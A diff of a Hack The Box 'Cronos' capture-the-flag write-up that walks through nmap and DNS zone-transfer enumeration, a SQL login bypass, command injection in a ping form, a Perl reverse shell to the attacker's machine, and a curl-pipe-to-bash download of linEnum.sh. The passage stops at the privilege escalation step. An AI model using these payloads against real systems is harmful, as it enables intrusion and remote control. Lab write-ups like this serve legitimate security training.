@@ -4,80 +4,95 @@
 > Solved: 25th June 2021<br/>
 
 ## Intro
-Cronos is a Linux (ubuntu) machine which i found interesting to solve. Below i'll log how i approached it and what more could be done.
+Cronos is an interesting  Linux (ubuntu) machine. Below is the log of how i approached it.
 
+<br/>
 ## Enumeration
-Lets first scan the box with nmap to see services running. I used below command:<br/>
+Lets first scan the box with nmap to see services running. We use below command:<br/>
 
     `$ nmap -sC -sV -oA nmap/cronos 10.10.10.13`<br/>
     
-Above command runs nmap with default scripts (`-sC`), version detection (`-sV`) and creates output in various file formats.
+Above command runs nmap with default scripts `-sC`, version detection `-sV` and creates output in other file formats.
 <br/>
 
 The scan gives the following output:
-![](./images/cronos_nmap)
+![Nmap Image](./images/cronos_nmap.png)
 
 We have services running on port 22, 53 and 80. We'll check them in detail.
 
-First, lets check out website running on port 80, it just gives us default Apache page. I tried gobuster on it but found no directories.
-![](./images/cronos_apacheDefault.png)
+First, lets check the website running on port 80. 
 
-Then i turned my attention to port 53, I had no idea about ISC BIND service running. Searching the internet provided good idea about it.
+![](./images/cronos_apacheDefault.png)
+it just gives us default Apache page. I tried gobuster on it but found no directories. :(
+
+<br/>
+
+Then i turned my attention to port 53, I had no idea about <span id=yellow>ISC BIND service</span>. Searching the internet provided good idea about it.<br/>
 Below is a simple description:
 > BIND (Berkeley Internet Name Domain) is an open source software that enables you to publish your Domain Name System (DNS) information on the Internet, and to resolve DNS
 queries for your users.
 
-Now i looked at `searchsploit` for known exploits, spent some time with the exploits that came up, but they also didn't work.
+Now i looked at `searchsploit` for known any exploits, spent some time with the exploits that came up, but none of them worked.
 
-After a while i queried the server for its reverse DNS record, i used command `dig @10.10.10.13 -x 10.10.10.13`
-Below we can see, it worked:
+After a while i queried the server for its <u>reverse DNS record</u>, i used command `dig @10.10.10.13 -x 10.10.10.13`<br/>
+Below we can see, that the server responded:
+
 ![](./images/cronos_dig1.png)
 
-I have new domains. So i added ns1.cronos.htb and cronos.htb to my host file.
+Now, we have new domains. So i added <span id=yellow>ns1.cronos.htb</span> and <span id=yellow>cronos.htb</span> to my host file.<br/>
 Visiting cronos.htb and ns1.cronos.htb provided with a simple webpage created using Laravel and no further directories were revealed with gobuster .
-So this seemed like a dead end.
+So this seemed like a dead end. :(
 
-Now, since this is a DNS Server, it tried zone transfer and it worked. See below:
+
+Now, since this is a DNS Server, it tried to do <u>zone transfer</u> and it worked. See below:
+
 ![](./images/cronos_dig.png)
-Also, it revealed admin portal. admin.cronos.htb
+Also, this revealed the admin portal. <span id=green>admin.cronos.htb</span>
+
 
 Now i visited admin.cronos.htb and was greeted with a login form as shown below
+
 ![](./images/cronos_adminpanel.png)
 
-I tried with few basic payloads and got in with simple SQL authentication bypass payload:<br/>
-    `admin' or '1'='1'#`  or  `admin' #`  worked.
+I tried basic payloads and got in with a simple SQL authentication bypass payload:<br/>
+    `admin' or '1'='1'#`  or  `admin' #`  worked for me.
     
 Below is the request in Burp 
 ![](./images/cronos_authbypass.png)
 
-After the bypass it redirected me to a simple webpage, where two commands  `traceroute` and `ping` could be run. 
+After the bypass it redirected me to a simple webpage, where two commands  `traceroute` and `ping` could be executed. 
 
-I verified if i could ping my machine and it did, below we can see used tcpdump to capture ping request coming to my machine.
+I verified if i could ping my machine, below we can see `tcpdump` capturing ping request coming to our machine.
 ![](./images/cronos_cmdexecution.png)
 
-Next, it was only natural to try to see if i could get command execution here.
+Next, it was only natural to try to see if i could get <span id=green>command execution here</span>.<br/>
 So i tried the payload `8.8.8.8; ls` and it displayed the contents of web root directory. Great! We have command execution.
 
 Next i set up a listener on my local machine and ran a reverse shell on the server and got the session.<br/>
-Payload using perl reverse shell
+
+![](./images/cronos_perlshell.png)
+
+Perl reverse shell Payload used above:
 ```perl
 8.8.8.8; perl -e 'use Socket;$i="10.10.14.7";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
-![](./images/cronos_perlshell.png)
 
-Below i got the session :)
+
+Below we can see, we get a session on our local machine <span id=green>:)</span>
 ![](./images/cronos_rshell1.png)
 
-Now, we have session on the server. we see a home directory of user `noulis` and there we get our `user.txt` flag.
+Now, we have session to server. we see a home directory of user `noulis` and there we get our `user.txt` flag.
 
 Next task: Priveldge escalation.
+<br/>
 
 ## Priveledge Escalaiton
 
-Make a local python server and upload the `linEnum.sh` script.
+Make a local python server and upload the `linEnum.sh` script.<br/>
 
-Start a local python server  : `$ python -m SimpleHTTPServer 8181`
-Download and run on attacker :  `$ curl http://10.10.14.7/linEnum.sh | bash`
+  Start a local python server  : `$ python -m SimpleHTTPServer 8181`
+  Download and run on attacker :  `$ curl http://10.10.14.7/linEnum.sh | bash`
+  
 ![](./images/cronos_linEnum1.png)
 
 Spent some times time looking at the output, its a lot. Then came across something interesting:
